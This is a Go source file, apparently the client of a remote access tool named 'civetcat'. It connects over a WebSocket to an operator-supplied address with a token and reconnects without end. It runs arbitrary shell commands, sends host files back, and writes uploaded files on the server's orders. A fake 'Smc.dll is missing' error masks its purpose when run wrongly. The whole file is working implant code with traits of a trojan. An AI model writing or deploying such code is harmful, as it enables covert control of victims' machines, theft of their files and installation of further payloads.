package main

import (
	"civetcat/agent/agent_server"
	"civetcat/agent/socket_conn"
	"civetcat/pb"
	"github.com/golang/protobuf/proto"
	"log"
	"os"
)

func main() {
	if len(os.Args) != 3 {
		log.Fatalln("Smc.dll is missing")
	}
	addr := os.Args[1]
	token := os.Args[2]

	conn := socket_conn.NewAgentWebSocket(addr, token)
	// send one
	for {
		for {
			read, err := conn.Read()
			if err != nil {
				conn.Close()
				for {
					err := conn.Reconnect()
					if err != nil {
						continue
					} else {
						break
					}
				}
				continue
			}
			ic := &pb.Resp{}
			err = proto.Unmarshal(read, ic)
			if err != nil {
				log.Fatalln(err)
			}
			switch ics := ic.RespItem.(type) {
			case *pb.Resp_DownLoad:
				load := agent_server.DownLoad(ics.DownLoad.FilePath)
				pb := &pb.Resp{
					RespItem:&pb.Resp_GeneralResp{GeneralResp:load},
				}
				marshal, err := proto.Marshal(pb)
				if err != nil {
					log.Fatalln(err)
				}
				conn.Write(marshal)
			case *pb.Resp_Shell:
				shell := agent_server.Shell(ics.Shell.Cmd)
				pb := &pb.Resp{
					RespItem:&pb.Resp_GeneralResp{GeneralResp:shell},
				}
				marshal, err := proto.Marshal(pb)
				if err != nil {
					log.Fatalln(err)
				}
				conn.Write(marshal)
			case *pb.Resp_Upload:
				shell := agent_server.Upload(ics.Upload.FileName, ics.Upload.Body)
				pb := &pb.Resp{
					RespItem:&pb.Resp_GeneralResp{GeneralResp:shell},
					}
				marshal, err := proto.Marshal(pb)
				if err != nil {
					log.Fatalln(err)
				}
				conn.Write(marshal)
			}
		}

	}
}
